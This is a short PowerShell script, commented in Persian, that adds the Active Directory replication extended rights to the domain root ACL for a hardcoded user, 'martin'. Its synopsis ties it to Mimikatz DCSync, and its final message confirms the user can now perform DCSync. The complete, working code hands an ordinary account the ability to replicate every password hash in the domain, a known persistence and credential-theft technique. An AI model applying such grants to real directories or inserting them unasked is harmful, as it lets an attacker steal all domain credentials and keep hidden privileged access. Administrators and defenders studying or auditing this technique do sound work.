

```powershell
<#
.SYNOPSIS
    Grant DCSync (Replication) permissions to a specific user.
    Required for tools like Mimikatz DCSync or legitimate replication tasks.
#>

# نام کاربری مورد نظر را اینجا وارد کنید
$TargetUserName = "martin"

Import-Module ActiveDirectory

# به دست آوردن DistinguishedName دامین
$DomainDN = (Get-ADDomain).DistinguishedName
$User = Get-ADUser -Identity $TargetUserName -ErrorAction SilentlyContinue

if (-not $User) {
    Write-Error "User '$TargetUserName' not found in Active Directory."
    return
}

$UserSID = New-Object System.Security.Principal.SecurityIdentifier($User.SID)

Write-Host "[+] Granting Replication permissions to: $($User.SamAccountName)" -ForegroundColor Cyan

# تعریف GUIDهای مربوط به دسترسی‌های Replication
$ReplicationGuids = @{
    "Replicating Directory Changes"      = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    "Replicating Directory Changes All"  = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    "Replicating Directory Changes In Filtered Set" = "89e95b76-444d-4c62-991a-0facbeda0a3b"
}

# دریافت ACL فعلی دامین
$Acl = Get-ACL "AD:\$DomainDN"

foreach ($Name in $ReplicationGuids.Keys) {
    $Guid = [Guid]$ReplicationGuids[$Name]
    
    # ایجاد یک Access Rule جدید
    # ObjectType: GUID دسترسی
    # ActiveDirectoryRights: ExtendedRight
    # AccessControlType: Allow
    # InheritanceType: None (دسترسی باید مستقیماً روی Object دامین باشد)
    $Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $UserSID,
        "ExtendedRight",
        "Allow",
        $Guid,
        "None"
    )
    
    $Acl.AddAccessRule($Ace)
    Write-Host "    - Added: $Name"
}

# اعمال ACL جدید به دامین
Set-ACL "AD:\$DomainDN" -AclObject $Acl

Write-Host "[+] Permissions granted successfully." -ForegroundColor Green
Write-Host "[!] Note: The user '$TargetUserName' can now perform DCSync operations." -ForegroundColor Yellow

```



